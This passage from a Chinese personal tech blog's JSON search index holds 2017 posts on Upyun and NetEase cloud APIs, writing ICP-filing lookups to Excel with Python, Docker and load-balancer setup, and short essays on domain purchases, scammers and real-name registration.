fetch(url)该函数主要是把requrl请求后的返回值传入，然后调用又拍云的异步拉取接口拉取","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"国外买域名真的就好嘛？","slug":"国外买域名真的就好嘛？","date":"2017-08-16T23:05:53.000Z","updated":"2021-02-26T06:05:29.321Z","comments":true,"path":"posts/29144.html","link":"","permalink":"https://awen.me/posts/29144.html","excerpt":"我们都知道，国内买域名，需要一系列的实名认证，买域名要实名，不然不能用，然后要想域名能访问国内的资源，还需要备案。如果你发表了让我朝不满意的话，比较严重的还有可能域名被禁掉，于是很多人，尤其是做自己个人博客的都直接买国外域名然后+国外vps搭建web服务，可是买国外的域名真的就好吗？ 其实真的不一定！","text":"我们都知道，国内买域名，需要一系列的实名认证，买域名要实名，不然不能用，然后要想域名能访问国内的资源，还需要备案。如果你发表了让我朝不满意的话，比较严重的还有可能域名被禁掉，于是很多人，尤其是做自己个人博客的都直接买国外域名然后+国外vps搭建web服务，可是买国外的域名真的就好吗？ 其实真的不一定！ 首先，我以国外的最大域名厂商-godaddy为例，在狗爹买域名，隐私保护这一项是需要单独付费的，而在阿里云则不需，并且域名稍微比国内贵点。不过，放在国外大环境要好点，不至于因为写一些东西就被封域名，比如某些技术的分享，当然也仅仅是指域名，但是别忘记还有墙的哦，封不了你，不让你在国内访问总是可以的。 不过大多数人也只是自己写写技术文章，不涉及政治什么的，也不会被封啦！ 其次，国外大多没有中文支持，狗爹倒是有，但是电话费你主叫要你自己掏电话费呀！这比国内直接工单支持（虽然比较慢）要好很多。狗爹的客服妹纸声音很甜，并且可能要等很久，昨天一个电话过去为了迁移域名的问题，花了15分钟，我不喜欢这样的沟通方式。 如果不用中文支持，切换到其他语言是有英文工单系统的，不过你得能和老外聊的来。他们是不懂中文的！","categories":[],"tags":[{"name":"域名","slug":"域名","permalink":"https://awen.me/tags/%E5%9F%9F%E5%90%8D/"}]},{"title":"使用又拍云的压缩和解压缩","slug":"使用又拍云的压缩和解压缩","date":"2017-08-16T12:26:19.000Z","updated":"2021-02-26T06:05:29.311Z","comments":true,"path":"posts/27968.html","link":"","permalink":"https://awen.me/posts/27968.html","excerpt":"有时候我们需要把云存储的文件进行压缩，或者把上传的压缩包解压缩。那么这在又拍云上可以调用其云存储api 来实现，具体如何实现，可以参考文档 本节，我将使用又拍云的 Python sdk 带你使用压缩和解压缩","text":"有时候我们需要把云存储的文件进行压缩，或者把上传的压缩包解压缩。那么这在又拍云上可以调用其云存储api 来实现，具体如何实现，可以参考文档 本节，我将使用又拍云的 Python sdk 带你使用压缩和解压缩 压缩和解压缩1.按照sdk，请通读一遍GitHub主页的说明https://github.com/upyun/python-sdk 其实，不管使用任何产品，不论是又拍云还是阿里云或者其他厂商的，看文档是最佳的选择，当你刚接触他们的产品时，可以自己先看一遍对应的文档怎么调用方法，怎么计算签名等等。自己先看一遍，对某个参数不懂再问技术。我特别讨厌那些伸手党，发了文档都不看，还要你手把手奉上demo，也是够了，你工资咋不让我给你领？ 2.代码 #!/usr/bin/env python #-*-coding:utf-8-*- import upyun up = upyun.UpYun(&apos;servername&apos;, &apos;username&apos;, &apos;password&apos;, timeout=30, endpoint=upyun.ED_AUTO) notify_url = &apos;http://res.v5linux.com/res.php&apos; # 压缩部分 def compress(): compress_tasks = [ { &quot;sources&quot;: [&quot;/a/1.jpg!awen)&quot;,&quot;/b/1.jpg!awen)&quot;], &quot;save_as&quot;: &quot;/CCC/1.zip&quot;, &quot;home_dir&quot;: &quot;a/&quot; } ] print up.put_tasks(compress_tasks, notify_url, &apos;compress&apos;) #解压缩部分 def depress(): depress_tasks = [ { &quot;sources&quot;: &quot;/CCC/t.zip&quot;, &quot;save_as&quot;: &quot;CCC/t/&quot;, }, ] print up.put_tasks(depress_tasks, notify_url, &apos;depress&apos;) compress()比如上面调用了compress 压缩，会打印taskid [u&apos;3ea50b3a0da720383c7a786f00dbd085&apos;]然后 notify_url 是定义了回调地址，当请求处理完毕，会向你的接口发送回调信息 注意: 回调地址必须是公网能访问。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"不要买国产的计算机类图书","slug":"不要买国产的计算机类图书","date":"2017-08-15T02:33:50.000Z","updated":"2021-02-26T06:05:29.296Z","comments":true,"path":"posts/14221.html","link":"","permalink":"https://awen.me/posts/14221.html","excerpt":"","text":"在前2年，我买了很多关于计算机类的图书，比如pyhon、Linux、NGINX权威指南啊等等。回来后翻了下就仍了，原因是什么呢？ 第一，软件版本更新太快，比如nginx，书中用的是0.x的版本，现在都1.13.1了。第二，国内的一些作者写的书那叫一个垃圾，错误一堆，甚至有的就是照抄一些社区文档。比如一次关于严重侵犯著作权的事件第三，即使没有错误，你看了是要动手操作的，拿着书远不如电子文档一边看着一边敲命令代码来的速度。 我看过很多国内作者写的计算机类书，很多都是对着他写的去实现是根本实现不了的。这他妈的就尴尬了，于是就仍到一边。所以提醒各位学习计算机的同学： 不要买国产计算机书！垃圾不要买国产计算机书！垃圾不要买国产计算机书！垃圾 不过，一些工具书，比如HTTP权威指南，还是可以备上一本的。在比如鸟哥的Linux私房菜，一些国外写的书，国内翻译的可以买本，其他的完全不推荐。都垃圾，至少我目前看过的都是。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"骗子","slug":"骗子","date":"2017-08-14T07:23:25.000Z","updated":"2021-02-26T06:05:29.360Z","comments":true,"path":"posts/40527.html","link":"","permalink":"https://awen.me/posts/40527.html","excerpt":"现在的骗子真的是无孔不入，昨晚，我在家里，突然有人在窍门，我以为是隔壁邻居或者是房东，于是就开门了，然后一个20多岁的小姑娘自称是杭州疾病控制预防中心的工作人员，手里拿着一个表，然后还带着一个工作证，说现在统一发放蟑螂药。我一听到这，我就直接拒绝了。然后关上了门，那姑娘又去敲我隔壁邻居的门去了。","text":"现在的骗子真的是无孔不入，昨晚，我在家里，突然有人在窍门，我以为是隔壁邻居或者是房东，于是就开门了，然后一个20多岁的小姑娘自称是杭州疾病控制预防中心的工作人员，手里拿着一个表，然后还带着一个工作证，说现在统一发放蟑螂药。我一听到这，我就直接拒绝了。然后关上了门，那姑娘又去敲我隔壁邻居的门去了。 关上门后，我就觉得不对劲，对这个所谓的杭州疾病控制预防中心的姑娘产生了怀疑，首先： 昨天是周日，我门这种公司都不上班的啊，更何况政府部门！ 其次，大晚上八九点敲门发蟑螂药，这机关单位可真敬业啊。并且还是在周末给居民发蟑螂药？ 如果说这个姑娘直接推销蟑螂药，我还不怀疑了，可是他自称是政府部门的让，我就觉得这其中有古怪，习惯性的查了下，输入关键词： 杭州 上门 蟑螂 ，在搜索结果的第一页都是骗子的结果，果然验证了我的疑虑。 进入到杭州公安的网站看了下 验证骗子无疑。 所以，生活在城市里，骗子也是很多的嘛，由于没有直接证据证明他向我行骗了，我没有报警。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"python将数据写入excel","slug":"python将数据写入excel","date":"2017-08-13T08:35:53.000Z","updated":"2021-02-26T06:05:29.288Z","comments":true,"path":"posts/26356.html","link":"","permalink":"https://awen.me/posts/26356.html","excerpt":"最近有个需求，我通过request库调用api接口查询备案信息，然后我要将这些信息写入到excel中，经过一番谷歌后，我使用python的openpyxl库可以很轻松的实现把输入写入excel。原因是他支持比较新的excel格式，比如xlsx。","text":"最近有个需求，我通过request库调用api接口查询备案信息，然后我要将这些信息写入到excel中，经过一番谷歌后，我使用python的openpyxl库可以很轻松的实现把输入写入excel。原因是他支持比较新的excel格式，比如xlsx。 使用非常简单： from openpyxl import Workbook wb = Workbook() ws = wb.active ws[&apos;A1&apos;] = &quot;&quot; ws[&quot;B1&quot;] = &quot;&quot; ws[&quot;C1&quot;] = &quot;&quot; ws[&quot;D1&quot;] = &quot;&quot; ws[&quot;E1&quot;] = &quot;&quot; ws[&quot;F1&quot;] = &quot;&quot; ws[&quot;G1&quot;] = &quot;&quot; ws.append([getdomain,getnature,getname, getindexurl,getsitename,getnoicp,N]) wb.save(&quot;信息1.xlsx&quot;) wb.close()它更具体的使用方法，可以出参考文档 参考代码#!/usr/bin/env python #-*-coding:utf-8-*- import requests import json import time from openpyxl import Workbook # 获取到备案号调用checkarea 判断归属哪个区,N 代表华北,E 代表华东，S 代表华南 def checkarea(area): N = [&quot;京&quot;, &quot;津&quot;, &quot;冀&quot;, &quot;晋&quot;, &quot;蒙&quot;, &quot;辽&quot;, &quot;吉&quot;, &quot;黑&quot;, &quot;陕&quot;, &quot;甘&quot;, &quot;青&quot;, &quot;宁&quot;, &quot;新&quot;] E = [&quot;沪&quot;, &quot;苏&quot;, &quot;浙&quot;, &quot;皖&quot;, &quot;赣&quot;, &quot;鲁&quot;, &quot;豫&quot;, &quot;闽&quot;] S = [&quot;粤&quot;, &quot;桂&quot;, &quot;琼&quot;, &quot;鄂&quot;, &quot;湘&quot;, &quot;渝&quot;, &quot;蜀&quot;, &quot;黔&quot;, &quot;滇&quot;] # print(area) if area in N: return &quot;N&quot; if area in E: return &quot;E&quot; if area in S: return &quot;S&quot; def CheckDomain(): wb = Workbook() ws = wb.active # 表名称 ws.title = &quot;数据&quot; # 对应列的名称 ws[&apos;A1&apos;] = &quot;域名&quot; ws[&quot;B1&quot;] = &quot;企业/个人&quot; ws[&quot;C1&quot;] = &quot;名称&quot; ws[&quot;D1&quot;] = &quot;主页地址&quot; ws[&quot;E1&quot;] = &quot;网站名称&quot; ws[&quot;F1&quot;] = &quot;备案号&quot; ws[&quot;G1&quot;] = &quot;地区&quot; # 读取域名列表 with open(&quot;source.txt&quot;) as f: while 1: lines = f.readlines(100000) # 使用readlines读取数据效率更高 if not lines: break for line in lines: #接口地址 api = &quot;http://www.sojson.com/api/beian/&quot; # 伪造个user-agent 避免被接口判断为机器人请求，并且加上no-cache的头，避免读取到缓存缓存 headers = {&quot;User-Agent&quot;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,&apos;cache-control&apos;:&apos;no-cache&apos;} #调用接口获取备案信息 try: r = requests.get(api+line.strip(&apos;\\n&apos;),headers=headers) except (requests.ConnectionError, IndexError, UnicodeEncodeError,TimeoutError): print(&quot;请求异常，无法连接服务器&quot;) except requests.HTTPError as f: print(&apos;请求异常，HTTP错误&apos;) finally: info = r.json() # 如果备案type值为200，说明有备案信息，获取对应的备案号，公司名等信息，如果不是200 则说明没有获取到备案信息 if info[&apos;type&apos;] == 200: print(info) # 获取备案主体 getnature = info[&apos;nature&apos;] # 获取名称 getdomain = info[&apos;domain&apos;].strip() print(getdomain) #获取主体名字名字 if getnature ==&quot;个人&quot;: getname = &quot;个人&quot; elif getnature ==&quot;企业&quot;: getname = info[&apos;name&apos;] else: getname = info[&apos;name&apos;] # 获取备案号 getnoicp = info[&apos;nowIcp&apos;] getarea = checkarea(info[&apos;nowIcp&apos;][0]) # 获取主页地址 getindexurl = info[&apos;indexUrl&apos;] # 获取网站名称 getsitename = info[&apos;sitename&apos;] # 根据备案号的第一个下标的值来判断所属的大区是华北、华东还是华南，然后写入到表格的没一行中 if getarea == &quot;N&quot;: N = &quot;华北&quot; ws.append([getdomain,getnature,getname, getindexurl,getsitename,getnoicp,N]) if getarea ==&quot;E&quot;: E = &quot;华东&quot; ws.append([getdomain, getnature, getname, getindexurl, getsitename, getnoicp,E]) if getarea == &quot;S&quot;: S = &quot;华南&quot; ws.append([getdomain,getnature,getname,getindexurl,getsitename,getnoicp,S]) else: ws.append([line,&apos;无备案信息&apos; ,&apos;&apos; ,&apos;&apos;,&apos;&apos; ]) # 保存表格为xlsx wb.save(&quot;客户信息1-2.xlsx&quot;) # 避免被接口拒绝，3秒请求一次 time.sleep(3) # 关闭表格的数据写入 wb.close() print(&quot;Job Done!&quot;) CheckDomain()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"吐槽icloud","slug":"吐槽icloud","date":"2017-08-13T08:21:48.000Z","updated":"2021-02-26T06:05:29.321Z","comments":true,"path":"posts/31606.html","link":"","permalink":"https://awen.me/posts/31606.html","excerpt":"","text":"最近几天没写文章？为啥呢？因为我的hexo的站点配置文件丢了，很奇怪的就丢了，原因是我之前一直开着icloud 同步数据，头一天晚上还是好好的呢!我大概就是操作了下停止icloud同步MAC的Documents的操作，然后配置文件就没了。","categories":[],"tags":[{"name":"icloud","slug":"icloud","permalink":"https://awen.me/tags/icloud/"}]},{"title":"python requests库调用网易蜂巢API","slug":"python-requests库调用网易蜂巢API","date":"2017-08-08T13:42:10.000Z","updated":"2021-02-26T06:05:29.282Z","comments":true,"path":"posts/1435180195.html","link":"","permalink":"https://awen.me/posts/1435180195.html","excerpt":"没事看了下网易蜂巢的控制台API，参考文档写了一部分创建云主机的API练练手，主要是通过requests库来发送 HTTP 请求完成各种数据的发送","text":"没事看了下网易蜂巢的控制台API，参考文档写了一部分创建云主机的API练练手，主要是通过requests库来发送 HTTP 请求完成各种数据的发送 具体代码#!/usr/bin/env python #-*-coding:utf-8 import requests import json # 获取token def returnToken(app_key,app_secret): api = &apos;https://open.c.163.com/api/v1/token&apos; payload = {&quot;app_key&quot;:app_key,&quot;app_secret&quot;:app_secret} headers = { &apos;content-type&apos;: &quot;application/json&quot;, &apos;cache-control&apos;: &quot;no-cache&quot; } response = requests.request(&quot;POST&quot;, api, data=json.dumps(payload), headers=headers) token = response.text # 输出的是&lt;type &apos;unicode&apos;&gt; tokenInfo = json.JSONDecoder().decode(token) # 转换成json格式 return tokenInfo[&quot;token&quot;] #获取镜像 def getpubimages(token): api =&apos;https://open.c.163.com/api/v1/vm/publicimages?pageSize=4&amp;pageNum=1&amp;keyword=os&amp;Type=linux&apos; headers = { &apos;content-type&apos;: &quot;application/json&quot;, &apos;cache-control&apos;: &quot;no-cache&quot;, &apos;Authorization&apos;:&apos;Token &apos;+token } response = requests.request(&quot;GET&quot;,api,headers=headers) tokenInfo = json.JSONDecoder().decode(response.text) imagesid = tokenInfo[&quot;images&quot;][0][&apos;imageId&apos;] return imagesid # 创建虚拟机 def createvm(tokenValue,instance_name,ssh_key_names,image_id,cpu_weight,memory_weight,ssd_weight): api = &apos;https://open.c.163.com/api/v1/vm&apos; payload = { &quot;bill_info&quot;:&quot;HOUR&quot;, &quot;server_info&quot;:{ &quot;instance_name&quot;:instance_name, &quot;ssh_key_names&quot;:[ssh_key_names], &quot;image_id&quot;:image_id, &quot;cpu_weight&quot;:cpu_weight, &quot;memory_weight&quot;:memory_weight, &quot;ssd_weight&quot;:ssd_weight, } } headers = { &apos;content-type&apos;: &quot;application/json&quot;, &apos;cache-control&apos;: &quot;no-cache&quot;, &apos;Authorization&apos;:&apos;Token &apos;+tokenValue } serveresponse = requests.request(&quot;POST&quot;, api, data=json.dumps(payload), headers=headers) serverid = json.JSONDecoder().decode(serveresponse.text) # 转换成json格式 print serverid def listvm(): api = &apos;https://open.c.163.com/api/v1/vm/allInstanceInfo?pageSize=4&amp;pageNum=1&apos; headers = { &apos;cache-control&apos;: &quot;no-cache&quot;, &apos;Authorization&apos;: &apos;Token &apos; + tokenValue } listvm = requests.request(&quot;GET&quot;, api, headers=headers) return listvm.json() def createsshkey(token,name): api = &apos;https://open.c.163.com/api/v1/secret-keys&apos; headers = { &apos;content-type&apos;: &quot;application/json&quot;, &apos;cache-control&apos;: &quot;no-cache&quot;, &apos;Authorization&apos;: &apos;Token &apos; + token } payload = {&quot;key_name&quot;: name} response = requests.request(&quot;POST&quot;, api, data=json.dumps(payload), headers=headers) sshkey = response.text # 输出的是&lt;type &apos;unicode&apos;&gt; sshKeyInfo = json.JSONDecoder().decode(sshkey) # 转换成json格式 return sshKeyInfo def getsshkey(token): api = &apos;https://open.c.163.com/api/v1/secret-keys&apos; headers = { &apos;content-type&apos;: &quot;application/json&quot;, &apos;cache-control&apos;: &quot;no-cache&quot;, &apos;Authorization&apos;: &apos;Token &apos; + token } response = requests.request(&quot;GET&quot;, api, headers=headers) sshkey = response.text # 输出的是&lt;type &apos;unicode&apos;&gt; sshKeyInfo = json.JSONDecoder().decode(sshkey) # 转换成json格式 sshKeyInfo = str(sshKeyInfo[0][&apos;name&apos;]) return sshKeyInfo tokenValue = returnToken(&quot;&quot;,&quot;&quot;) print tokenValue instance_name = &apos;centos7&apos; ssh_key_names = getsshkey(tokenValue) image_id =getpubimages(tokenValue) cpu_weight= 1 memory_weight = 2 ssd_weight = 20 # createvm(tokenValue,instance_name,ssh_key_names,image_id,cpu_weight,memory_weight,ssd_weight) listvm()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"网易蜂巢使用云主机并搭建docker环境配置负载均衡","slug":"创建蜂巢云主机并搭建docker环境手册","date":"2017-08-08T13:12:02.000Z","updated":"2021-02-26T06:05:29.316Z","comments":true,"path":"posts/1151056992.html","link":"","permalink":"https://awen.me/posts/1151056992.html","excerpt":"创建云主机网易蜂巢提供2种方式管理服务，一种是控制台方式，一种是API接口，本文主要以控制台方式讲解。","text":"创建云主机网易蜂巢提供2种方式管理服务，一种是控制台方式，一种是API接口，本文主要以控制台方式讲解。 基本的配置首先，打开网易蜂巢的控制台，点击右侧的云主机-创建云主机，我们需要创建一个 Linux 操作系统，具体参数如下: 类别 参数 计费方式 按量付费 可用区 A区 镜像 Centos7 规格 CPU：2核；内存:2G;系统盘，40G 云主机名称 docker-tomcat 配置SSH 密钥出于安全方面考虑，蜂巢不提供直接密码登录服务器的方式，但是提供 SSH 密钥的方式，您可以在创建云主机的时候选择: 创建一对新的密钥。 导入已有的本地公钥文件。 这里我们选择导入本地密钥，本地创建一对 SSH 密钥，我这里使用的是 MAC OS ，打开终端，执行: $ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/Users/wenjun/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /Users/wenjun/.ssh/id_rsa. Your public key has been saved in /Users/wenjun/.ssh/id_rsa.pub. The key fingerprint is: SHA256:wRIFAVPln+10aJmEcVNSh5nM1tbOF1TVsdh0rbEwWLI hi@mail.awen.me The key&apos;s randomart image is: +---[RSA 2048]----+ | oo==o oo==+O%| | . + .*oo%oO| | . + E .= X.| | . o + +o +| | S o B . .| | + . | | . | | | | | +----[SHA256]-----+根据提示创建一对RSA算法的不带密码的密钥，其路径在家目录的 .ssh 目录下,其中 id_rsa 是私钥文件，id_rsa.pub 是公钥文件，我们需要把公钥文件内容添加到平台,执行: $cat ~/.ssh/id_rsa.pub查看密钥内容，然后复制粘贴到控制台。 然后勾选刚才创建的 SSH 密钥，最后点击立即创建。 此时，我们就创建好了一台云主机，可以在云主机列表中查看。 远程连接默认情况下创建的主机是不提供外网 IP 地址的，蜂巢提供2种管理远程主机的方式，第一种是通过 OpenVPN 的方式，可以在控制台找到账户安全，下载OpenVPN的配置文件连接,具体使用方法参考[文档](http://support.c.163.com/md.html#!计算服务/容器服务/使用技巧/如何使用蜂巢 OpenVPN.md)。 然后下载应用程序，MAC 下拖拽配置文件到程序中，然后连接即可 当连接成功后，即可远程连接 ➜ .ssh ssh root@10.173.32.11 The authenticity of host &apos;10.173.32.11 (10.173.32.11)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:VQrvXo6fRvi+QFuqEG+onn2neeTvKjtbRJ6QqYDG5OA. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;10.173.32.11&apos; (ECDSA) to the list of known hosts. Last login: Tue Aug 8 14:02:21 2017 from 115.192.184.186另外一种方式就是绑定弹性公网 IP 的方式来远程，具体操作如下，点击控制台左侧的弹性公网 IP,创建弹性公网 IP。 创建完成之后会在列表中看到创建的 IP 地址。 下面我们要将 IP 绑定到云主机，点击左侧云主机，如何绑定，请参考[文档](http://support.c.163.com/md.html#!平台服务/弹性公网 IP/使用指南/绑定公网IP/公网IP绑定云主机.md)进行绑定。 绑定完成之后，我们就可以远程连接了。 ssh root@59.111.96.110 The authenticity of host &apos;59.111.96.110 (59.111.96.110)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:VQrvXo6fRvi+QFuqEG+onn2neeTvKjtbRJ6QqYDG5OA. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;59.111.96.110&apos; (ECDSA) to the list of known hosts. [root@docker-tomcat ~]# 当然，如果对于服务器的安全性要求较高，还是建议使用vpn的方式登录。 更新系统# yum -y update 安装 Docker我们选择的操作系统是 Centos7.2，可以使用如下命令安装 Docker: # yum -y install docker安装完毕后 可以查看docker的版本 # docker version Client: Version: 1.12.6 API version: 1.24 Package version: docker-1.12.6-32.git88a4867.el7.centos.x86_64 Go version: go1.7.4 Git commit: 88a4867/1.12.6 Built: Mon Jul 3 16:02:02 2017 OS/Arch: linux/amd64 Cannot connect to the Docker daemon. Is the docker daemon running on this host?启动docker# systemctl enable docker # 设置为开机自启动 # systemctl status docker # 开启docker如果启动出现问题，可以参考文档解决。 安装镜像打开蜂巢镜像中心，可以找到 tomcat，在云主机执行 # docker pull hub.c.163.com/public/tomcat:7.0.28安装 tomcat 镜像,安装完毕可以查看镜像 [root@docker-tomcat /]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/public/tomcat 7.0.28 1d333f1d42a5 17 months ago 266.9 MB后台运行容器# docker run -d 1d333f1d42a5 /bin/bash 1d65cec7f0f6347e879cc7a11aa2d45b2b530f56ec46be551940885a0fc9a801导出本地容器[root@docker-tomcat /]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 98a7fb3b27de 1d333f1d42a5 &quot;/bin/sh -c &apos;/etc/ini&quot; 57 seconds ago Up 57 seconds 22/tcp, 8080/tcp prickly_varahamihira [root@docker-tomcat /]# docker export 98a7 &gt; tomcat0808.tar本地镜像上传到蜂巢该部分内容参考文档 1.登录 [root@docker-tomcat /]# docker login -u hsweib@163.com -p password hub.c.163.com Login Succeeded2.标记本地镜像 [root@docker-tomcat /]# docker tag 1d333f1d42a5 hub.c.163.com/fangwenjun/tomcat3.推送镜像 [root@docker-tomcat /]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/public/tomcat 7.0.28 1d333f1d42a5 17 months ago 266.9 MB [root@docker-tomcat /]# docker tag 1d333f1d42a5 hub.c.163.com/fangwenjun/tomcat [root@docker-tomcat /]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 98a7fb3b27de 1d333f1d42a5 &quot;/bin/sh -c &apos;/etc/ini&quot; 6 minutes ago Up 6 minutes 22/tcp, 8080/tcp prickly_varahamihira [root@docker-tomcat /]# docker push hub.c.163.com/fangwenjun/tomcat The push refers to a repository [hub.c.163.com/fangwenjun/tomcat] 5f70bf18a086: Pushed 04ec86136189: Pushed 41eaba0ec3cd: Pushed bcaa3b393a28: Pushed f8cfb55c251b: Pushed 2712458540cb: Pushed 59dbd0a38594: Pushed bae03cbf1131: Pushed 84cf9f092c7a: Pushed 2ffc517b9e28: Pushed fb0c06d8457d: Pushed 9ef641aa2eea: Pushed 8730a9c82887: Pushed 72b520f75c37: Pushed c81b5c199370: Pushed ff07b305fdfa: Pushed a0f9bae65944: Pushed latest: digest: sha256:e245417df37590ec1e4d2eb543c23171e956dafc15a4263f1a10025d41bf8634 size: 14015然后在后台镜像仓库可以看到 使用私人镜像在镜像仓库中点击刚才创建的镜像，可以在页面种看到下载地址 执行 docker pull hub.c.163.com/fangwenjun/tomcat:latest然后查看会发现私人仓库的镜像也出现在了镜像列表中 [root@docker-tomcat /]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/fangwenjun/tomcat latest 1d333f1d42a5 17 months ago 266.9 MB hub.c.163.com/public/tomcat 7.0.28 1d333f1d42a5 17 months ago 266.9 MB负载均衡配置要配置负载均衡，我们需要在主机内创建2个容器并进行响应的数据卷和端口的映射。 注意:容器内的webapps目录在/var/lib/tomcat7/下，我们需要创建一个外部的卷来将其挂载到容器内使用，因此这里我们在服务器的/opt/目录下创建一个目录data和data1目录。 创建第一个容器查看本地镜像 [root@docker-tomcat data]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/fangwenjun/tomcat latest 1d333f1d42a5 17 months ago 266.9 MB hub.c.163.com/public/tomcat 7.0.28 1d333f1d42a5 17 months ago 266.9 MB [root@docker-tomcat data]#然后执行 [root@docker-tomcat data]# docker run -d -P --name web -v /opt/data/:/var/lib/tomcat7/webapps/ROOT/ -p 8080:8080 1d33 80fded28b17a58097f5c54361e9d161c5c97167aa2290a01989dbe2430989c55分配其数据卷为web;/opt/data/ 指向容器的webapps目录；本地端口8080映射到容器8080 查看端口映射 [root@docker-tomcat data]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 80fded28b17a 1d33 &quot;/bin/sh -c &apos;/etc/ini&quot; 40 seconds ago Up 39 seconds 0.0.0.0:8080-&gt;8080/tcp, 0.0.0.0:32769-&gt;22/tcp web [root@docker-tomcat data]# docker port 80f 22/tcp -&gt; 0.0.0.0:32769 8080/tcp -&gt; 0.0.0.0:8080在本地的data目录写入一个文件 [root@docker-tomcat data]# cat index.html this is test page然后访问，发现是可以通过公网IP 访问8080端口的，此时访问的就容器中的8080端口对应的tomcat资源 创建第二个容器分配其数据卷为web1;/opt/data1/ 指向容器的webapps目录；本地端口8081映射到容器8080 [root@docker-tomcat opt]# docker run -d -P --name web1 -v /opt/data1/:/var/lib/tomcat7/webapps/ROOT/ -p 8081:8080 1d33 9073cf3aeedbb155c74748a46f254f03bc71857d538b8f5480fd4711f9fa3b14查看端口映射 [root@docker-tomcat data1]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 9073cf3aeedb 1d33 &quot;/bin/sh -c &apos;/etc/ini&quot; 2 minutes ago Up 2 minutes 0.0.0.0:32770-&gt;22/tcp, 0.0.0.0:8081-&gt;8080/tcp web1 80fded28b17a 1d33 &quot;/bin/sh -c &apos;/etc/ini&quot; 9 minutes ago Up 9 minutes 0.0.0.0:8080-&gt;8080/tcp, 0.0.0.0:32769-&gt;22/tcp web [root@docker-tomcat data1]# docker port 80f 22/tcp -&gt; 0.0.0.0:32769 8080/tcp -&gt; 0.0.0.0:8080然后在/opt/data1目录写入一个html文件 [root@docker-tomcat data1]# echo docker2 &gt;&gt; index.html访问 发现可以访问到docker2的内容 创建负载均衡打开蜂巢后台，点击左侧的负载均衡 创建一个负载均衡,选择面向范围为－面向主机，然后输入一个名称，这里叫tomcat 然后切换到目标组 创建一个目标组，填写目标组名称，这里叫tomcat，后端组选择云主机，然后取消掉所有云主机使用相同端口的复选框，分别填写8080和8081两个端口，对应主机中的两个容器服务，确认无误后点击提交。 然后点击创建监听 填写监听名称，这里叫http，选择监听的协议，可以选择HTTP、HTTPS和TCP协议，填写监听端口，比如这里填80端口，转发规则就使用默认的规则，后端服务就选择我们刚才创建的tomcat组，会话保持，我们这里不启用，确认无误后创建。 此时我们拿负载均衡的IP地址去访问，可以看到是能够正常访问到后端的8080端口对应的容器服务的。 那么我们强制刷新几次浏览器，发现切换到后端的8081端口对应的服务了。说明负载均衡配置成功。","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"实名认证的利与弊","slug":"实名认证的利与弊","date":"2017-08-06T22:43:46.000Z","updated":"2021-02-26T06:05:29.332Z","comments":true,"path":"posts/3754881146.html","link":"","permalink":"https://awen.me/posts/3754881146.html","excerpt":"其实我这篇标题应该叫如何保护个人隐私，不过懒得改了。 在天朝，各种互联网应有都需要实名，比如 网购需要实名，比如淘宝，京东快递需要实名手机需要实名网络通讯需要实名，微信，QQ网站需要备案就连在天朝买个域名本身也需要实名直播要实名认证打车要实名认证几乎在国内干什么都需要实名认证","text":"其实我这篇标题应该叫如何保护个人隐私，不过懒得改了。 在天朝，各种互联网应有都需要实名，比如 网购需要实名，比如淘宝，京东快递需要实名手机需要实名网络通讯需要实名，微信，QQ网站需要备案就连在天朝买个域名本身也需要实名直播要实名认证打车要实名认证几乎在国内干什么都需要实名认证 在根据2017年6月1号实施的《网络安全法》更是对从事和经营互联网的企业以及使用互联网产品的个人进行了相关的规定，在第十二条中就规定了 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。 任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。从出发点上是好的，国家出台法律保障网络安全，当实名认证后，增加了骗子、网络暴民犯罪的成本，考虑到影响会谨慎发言，这是要肯定的。 